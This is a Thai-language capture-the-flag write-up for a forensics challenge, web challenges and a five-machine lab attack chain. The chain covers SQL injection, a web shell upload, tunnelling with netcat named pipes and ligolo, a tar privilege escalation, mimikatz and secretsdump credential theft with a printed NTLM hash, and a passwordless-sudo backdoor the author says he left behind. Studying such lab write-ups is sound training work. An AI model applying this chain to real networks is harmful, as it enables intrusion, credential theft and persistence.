*The company’s SIEM generated an alert for “Potential C2 Communication” after detecting that a laboratory workstation initiated an outbound TCP connection to a public IP address listed on the organization’s watchlist. The connection persisted only for a fraction of a second before terminating.* \
*Current Status:* \
*The workstation’s assigned user confirmed that they did not intentionally run any programs, and a review of “Add or Remove Programs” did not reveal any suspicious installations. As a result, the Incident Response (IR) team promptly performed a live memory acquisition to preserve volatile evidence before it could be lost due to system reboot or normal system activity. We require your assistance in identifying and analyzing the anomaly observed.* \
*Format flag: forensic{[[The hidden message]]}* \
*Merry_Chrismas.mem: Windows Event Trace Log*

ไฟล์ 2GB...

![50.png](./images/50.png)

เริ่มจากใช้ volatility windows.netscan ซึ่งเราเจอ owner แปลกๆตัวหนึ่งชื่อ `cGFzdGViaW4uY2` เมื่อเราถอด base64 จะได้ `pastebin.c` เราจึงสนใจ process `5868` นี้ทันที

![51.png](./images/51.png)

เราจึง dump มันออกมาแล้วลอง strings grep ดู ซึ่งก็พบว่ามี link pastebin.com อยู่

![52.png](./images/52.png)

เมื่อตามไปดูเราจะได้ github link ไปยัง readme ใน commit หนึ่ง

![53.png](./images/53.png)

ซึ่งคือ flag

Flag `forensic{kYhgftea4679}`

# North Pole

Solved by [@c0ffeeOverdose](https://github.com/c0ffeeOverdose)

![82.png](./images/82.png)

ข้อง่าย but ยากระดับพระกาฬ คำตอบคือ scan backup file เจอ `index.bak` มี secret key อยู่ในนั้น...

Flag `web{l02u2irD09}`

# SweetShop

*The new sweet just open :D Let eat some cake and candy.* \
*Flag Format web{...}*

![87.png](./images/87.png)

search อีกละ search อะไรละ

![86.png](./images/86.png)

หลังจากอ่าน source พบว่าเป็น ORM ซึ่งมี model ชื่อ Flag อยู่

![89.png](./images/89.png)

จุดน่าสงสัยเกิดขึ้นเมื่อเจอเข้ากับ unavailable_krub ที่มันไม่มีคำไทย และ Flag ที่ default='unavailable' เลยทำการลอง query `/products/?status=unavailable_krub`

![88.png](./images/88.png)

งงครับ... 🤔

Flag `web{gxcB3wdgm0}`

# XMas Factory#1 - Open Sesame

Solved by [@c0ffeeOverdose](https://github.com/c0ffeeOverdose)

![90.png](./images/90.png)

สำหรับเครื่องแรกจะเป็น web ครับ โดยเราพบว่ามีช่องโหว่ sql injection อยู่ สามารถใช้ sqlmap ออกมาได้ตรงๆเลย ซึ่งจะทำให้เราได้ admin credential ออกมาใช้ login ครับ

![91.png](./images/91.png)

แต่ในงาน [@c0ffeeOverdose](https://github.com/c0ffeeOverdose) ซนไปหน่อยครับ

![31.jpg](./images/31.jpg)

ขโมยมานั้นแหละครับ...

![92.png](./images/92.png)

หลังจาก login เข้ามาได้แล้วก็ upload shell เลย

![93.png](./images/93.png)

Flag `FLAG{W3b_Sh3ll_Upl04d_Succ3ss}`

# XMas Factory#2 - The Vault

เอาจริงเครื่อง web เครื่องแรกถือว่าเละพอตัวอยู่ครับ เรารัน shell / agent นานไม่ได้ เพราะโดน kill ซึ่งก็น่าจะรู้ๆกันแหละ

ซึ่งหาทางอยู่สักพักมีวิธีหนึ่ง work แก้ปัญหาไปก่อนคือ python + setsid แยกตอน shell php อีกที ซึ่งนั้นแหละครับ มันแปลกๆแต่มัน work เลยใช้ไปเลย

สำหรับเครื่องนี้จะเป็น database ครับ

![94.png](./images/94.png)

โดยเราได้ credential มาจาก config.php

![95.png](./images/95.png)

ซึ่งสามารถใช้ ssh เข้ามาได้เลย

ok ถึงจุดนี้ผมเข้ามาด้วยวิธี netcat + named pipe port forwarding ครับ เพราะรัน ligolo agent ไม่ได้ เลยใช้ netcat ต่อเข้า ssh port ตรงๆเลย ซึ่งก็ work ครับ ไม่หลุด

![96.png](./images/96.png)

หลังจากเข้ามาก็พบว่ามีช่องโหว่ backup script ครับ โดยเราสามารถที่จะเปลี่ยนตำแหน่งของ command tar ได้ เอาจริงมีคนทำไว้ให้แล้วแหละครับ แต่ผมซนนิดหน่อย

![97.png](./images/97.png)

![98.png](./images/98.png)

เสร็จแล้วไงต่อครับ ผมทำ sudo passwordless ทิ้งไว้ครับ แต่ไม่มีใครเข้ามาแล้วแหละผมว่า (ใกล้จบงานแล้ว)

Flag `FLAG{Pr1v3sc_V1a_Sud0_Pwn3d}`

# XMas Factory#3 - The Recruiter

สำหรับเครื่องนี้ต้องเข้าผ่านเครื่อง db ครับ ตอนนี้เป็น multi-layer tunneling แล้ว โดยทีมเราแก้ปัญหาโดยใช้ ssh เดิมที่วิ่งผ่าน netcat + named pipe ทำ reverse port ให้ ligolo agent รันบน db server แทน ซึ่ง work ครับ (ท่าประหลาดหน่อย) เลยสามารถใช้ ligolo กับ 3 เครื่องที่เหลือได้เลย

![99.png](./images/99.png)

โดยเครื่องนี้จะเป็นเครื่อง HR ครับ สามารถ rdp ได้เลย โดยเราจะได้ credential มาจาก db server ไฟล์ flag_monitor_b.sh ซึ่งอยู่ใน directory เดียวกันกับ flag.txt ครับ

![101.png](./images/101.png)

ใช้มัน remote ผ่าน rdp

![102.png](./images/102.png)

จริงๆมันควรเป็น AlwaysInstallElevated แหละครับ แต่ผมพยายามนานแล้ว ไม่ได้ผลครับ check โน่นนี้ ไม่รู้สาเหตุเหมือนกัน แต่ที่ได้เพราะผมแค่ไปเปลี่ยน permission file ตรงๆเลยครับ

![103.png](./images/103.png)

ทำการ add full access ให้ตัวเอง

![104.png](./images/104.png)

Flag `FLAG{W1nd0ws_Pr1v3sc_AlwaysInstallElevated}`

# XMas Factory#4 - The Backend

Solved by [@c0ffeeOverdose](https://github.com/c0ffeeOverdose)

ต่อจากเครื่อง HR ครับ ตัวเครื่องนี้จะเป็นเครื่อง IT โดยเราจะได้ credential มาจากเครื่อง HR นั้นแหละครับ โดยการใช้ mimikatz

![105.png](./images/105.png)

เราก็ใช้ evil-winrm remote เข้าไปดู

![106.png](./images/106.png)

โดย flag จะอยู่ใน path ที่เห็นเลยครับ แต่มันจะมีอีกที่คือ flag_monitor_c.ps1

Flag `FLAG{T0k3n_Imp3rs0n4t10n_FTW}`

# XMas Factory#5 - The Heart

Solved by [@c0ffeeOverdose](https://github.com/c0ffeeOverdose)

สำหรับเครื่องนี้จะเป็นเครื่อง domain control โดยจะได้ hash มาจาก tool impacket-secretsdump ครับ

```txt
Administrator 32c88d207d6ffc2e0bea9d51ec99949f
```

แล้วใช้ evil-winrm เข้าไปเอา flag เหมือนเดิม

![107.png](./images/107.png)

เช่นเดียวกับเครื่อง IT ครับ flag_monitor_e.ps1 (เครื่อง HR หา C:\scripts\ ไม่เจอ)

Flag `PWNED{Ch4in_Re4cTi0n_C0mpl3t3_SYSTEM_Access}`

![100.png](./images/100.png)

นี้ก็คือเครื่องต่างๆใน network ที่วาดออกมาคราวๆ ก็ solve หมดเป็นที่เรียกร้อย สำหรับ XMas Factory 4,5 ผมไม่ได้ทำเลยไม่รูปฮะ เลยได้แต่อธิบายว่าเข้าไปได้ประมาณนี้

---

ก็จบแล้วนะครับ สำหรับ Writeup งานนี้ เขียนนานเอาเรื่องอยู่ แต่ก็ไม่ได้ครบทุกข้อนะครับ บางข้อที่ข้อมูลน้อยๆก็ต้องขออภัยจริงๆครับ สำหรับงานนี้ผมเองก็ happy อยู่ครับที่ดันขึ้นมาได้ แต่ก็เหนื่อยอยู่ เจอ AD ครั้งแรก 😅

ไว้เจอกันใหม่ครับ ^_^
